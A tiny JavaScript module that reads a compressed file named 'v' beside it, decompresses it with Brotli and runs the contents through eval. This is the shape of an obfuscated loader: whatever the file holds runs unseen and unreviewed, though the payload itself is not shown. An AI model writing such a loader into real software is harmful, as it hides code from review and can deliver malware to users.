import{readFileSync as R}from'fs'
import{brotliDecompressSync as Z}from'zlib'
let b=R(import.meta.dirname+'/v')
let s=''+Z(b)
await eval(s)
